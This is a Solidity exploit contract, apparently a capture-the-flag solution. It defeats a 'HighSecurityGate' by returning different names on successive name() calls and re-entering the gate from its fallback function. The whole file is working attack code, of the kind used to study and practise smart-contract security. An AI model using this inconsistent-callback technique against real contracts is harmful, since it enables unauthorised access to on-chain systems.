// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

interface HighSecurityGate {
    function lastEntrant() external returns (string memory);
    function enter() external;
    function strcmp(string memory, string memory) external pure returns (bool);
}

contract Entrant {
    uint public c;
    HighSecurityGate private target;
    constructor (address payable addr_target) {
        target = HighSecurityGate(addr_target);
        c = 0;
    }
    function name() external returns (string memory) {
        string memory ret;
        if (c == 0) {
            ret = "Orion";
            c += 1;
        }
        else {
            ret = "Pandora";
            c = 0;
        }
        return ret;
    }
    fallback() external  {
        target.enter();
    }

}